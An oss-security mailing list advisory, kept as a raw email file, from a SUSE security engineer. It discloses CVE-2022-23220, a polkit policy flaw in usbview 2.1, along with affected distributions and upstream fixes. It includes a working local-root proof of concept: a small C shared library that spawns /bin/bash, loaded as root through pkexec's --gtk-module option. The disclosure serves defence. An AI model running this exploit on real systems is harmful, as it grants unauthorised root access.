X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4918" "Friday" "21" "January" "2022" "15:33:50" "+0100" "Matthias Gerstner" "mgerstner@suse.de" nil "129" "[oss-security] usbview polkit policy local root exploit (CVE-2022-23220)" nil nil nil "1" nil nil (number mark "U       mgerstner@su Jan 21  129/4918  " thread-indent "\"[oss-security] usbview polkit policy local root exploit (CVE-2022-23220)\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] usbview polkit policy local root exploit (CVE-2022-23220)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3327 invoked by uid 550); 21 Jan 2022 14:34:02 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3300 invoked from network); 21 Jan 2022 14:34:02 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
	t=1642775630; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=35kJrLdGzUMYdp+GS++w083EgO1Vb1kXOA2hQsWXHRw=;
	b=pSyvpx4osgEQru9llckEHGyDLQnWfDMacbZwFmUgEmYG6w7i34mLQIqEREFbin5jqx01ee
	6apq59y6yBa4TEYZ9XgRasonw5RyaU4V4KbRAP97LnDRuPObITSfTitSqj58uRaBadTShs
	eEEDVom3TswUL6qguc3J6iAFaMlureI=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
	s=susede2_ed25519; t=1642775630;
	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
	 mime-version:mime-version:content-type:content-type;
	bh=35kJrLdGzUMYdp+GS++w083EgO1Vb1kXOA2hQsWXHRw=;
	b=oDJc1B1Ul5oNO+kk1vCpyxjtmqSerhK2/QqwoYHuXmBLGU3MQA3Kmbjzl0xR2RF/8/2MuX
	zRhJ0FIgofZL9vBg==
Date: Fri, 21 Jan 2022 15:33:50 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <YerETqS+HCN4qz/Z@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="ixKmsWPOrvczZH//"
Content-Disposition: inline
Subject: [oss-security] usbview polkit policy local root exploit (CVE-2022-23220)

--ixKmsWPOrvczZH//
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

this is to inform you about a local root exploit I found in usbview [1]
release 2.1. This finding was embargoed for 7 days on the linux-distros
mailing list and the fix has been published today.

The upstream author Greg KH is currently working on an improved version
of usbview that will no longer require root privileges to run.

Following is the full report:

A polkit policy file has been added to usbview release 2.1 via commit
'ddefeba' [2] (already contributed in 2016). This policy file allows to
run usbview as root via Polkit's `pkexec` utility. This is a common
usage to run GUI applications as root. However, this policy file
contains problematic authentication settings:

    <allow_any>yes</allow_any>
    <allow_inactive>yes</allow_inactive>
    <allow_active>auth_admin_keep</allow_active>

These settings effectively mean that only a user in a local and active
(graphical) session needs to enter a root password to run usbview as
root. Users in inactive (e.g. locked) sessions or arbitrary other users
(e.g. logged in via SSH) can run usbview as root without providing any
authentication at all.

Some further review of this situation showed that this allows for a
pretty simple local root exploit by passing the `--gtk-module` command
line parameter to usbview. For example, assuming the local user 'nobody'
is compromised:

    # Simulate a compromised nobody account
    #
    # This needs to be run outside of a login session, e.g. from an SSH
    # shell. Alternatively one can use a "sleep 10 && pkexec ..." below
    # and then switch to another login terminal (like pressing
    # 'ctrl-alt-f1') during the execution of pkexec to mark the session
    # as inactive, causing the exploit to work as well.
    root# sudo -u nobody /bin/bash

    # build a simple shared library that executes /bin/bash upon loading
    nobody$ cd /tmp
    nobody$ gcc -omymod.so -fPIC -shared -x c - <<END
    #include <stdio.h>
    #include <unistd.h>

    static void exploit_init() __attribute__((constructor));

    void exploit_init() {
            execve("/bin/bash", NULL, NULL);
    }
    END

    # run usbview via pkexec as root, instructing GTK to load the
    # exploit library
    nobody$ pkexec /usr/bin/usbview --gtk-module=3D/tmp/mymod.so
    # root shell obtained
    root #

Because `gtk_init()` loads modules before even attaching to the
graphical environment, no X11 session or similar is required for this
exploit to succeed.

The problematic policy file seemingly already has been packaged for a
longer time in Debian Linux. Ubuntu also used this Debian package. On
Gentoo Linux the released version 2.1 was already stable and thus
affected. Fedora uses its own, safe version of the polkit policy file.
The Arch Linux package was not updated to version 2.1 and was thus not
affected.

The fix of the policy file itself is simple [3] and another change adds
a bit of hardening of the polkit invocation on top [4]. The fixes are
available in upstream release 2.2 [5].

I stumbled over this, because the usbview package in openSUSE Tumbleweed
wanted an update to version 2.1 and this new polkit policy appeared
which requires a review by the SUSE security team.

[1]: https://github.com/gregkh/usbview
[2]: https://github.com/gregkh/usbview/commit/ddefeba3f67d6a6f394eb57352254=
c1c8a312671
[3]: https://github.com/gregkh/usbview/commit/bf374fa4e5b9a756789dfd88efa93=
806a395463b
[4]: https://github.com/gregkh/usbview/commit/1282782301570b3ee27f82f4f34c2=
c1a82bfd91a
[5]: https://github.com/gregkh/usbview/commit/38e9dc56a437721f7a8b0ec1d2b4e=
611e090c87d

Regards

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Security Engineer
https://www.suse.com/security
GPG Key ID: 0x14C405C971923553
=20
SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Ivo Totev

--ixKmsWPOrvczZH//
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmHqxE0ACgkQFMQFyXGS
NVO6uxAAzpAAycEe3DR80xZwW6O2o9Qmkwp+jebmxuuxydUTP9tNs0KvgsKaxqol
U8s7072YuqAd1cNiIFUtdJW3Y35IKzJzATr9Xtq4XI6zcUOId54iSM1CVWsF25ra
rjpoz2GBy0IOaEDCJrV6TN4skJdmaubFlmysBNfJanPUlvlHBr1Y0hUETwIkO+Fa
Hvqlsv2WVS1KsEbLYXzcT/Tdcwmpgs017FADV0YJY9WwdnfzhxNlCfrISOMdCzrq
fK/fUOTaclLlOTHlwdkxL/SWvpp9mb/47Dny9N24sou5lS/+E8f1rXAbo2WjnUr4
dQsQVFq6RD/ZHYhyPCFb65Eg3nYnQLAnh3wqSZrUVq7hp6AyyV3ZT/8/rNXvZBf9
r2ejt8zwukaNHbF9xviNuVXeT+w10OTl5Hi+4ITz5R4A/0G2L4nTaBGdHifyJ+L8
Ny17lxYyJcBjCRrh6ys1yThNZTytVfnWooD842Sd1z67oMSndI6XKVgOty1EJiuj
K2RMhC8UxKM57Tp/rH3bG/M3xZsMtVMjDYMeX05Hy1cVOMfa7fGX0piJ4RzAgS/6
Z8YroDULR2ysggQK3rh6kTVSuDjh+krWoglIkbcXaVF0vf4tdPibdtl7686gQHiD
RI+pzQPXpinQ0JOCVDPCO8u1TmFwyMu82MwqNXc63ILXuxmlHM4=
=lF6R
-----END PGP SIGNATURE-----

--ixKmsWPOrvczZH//--
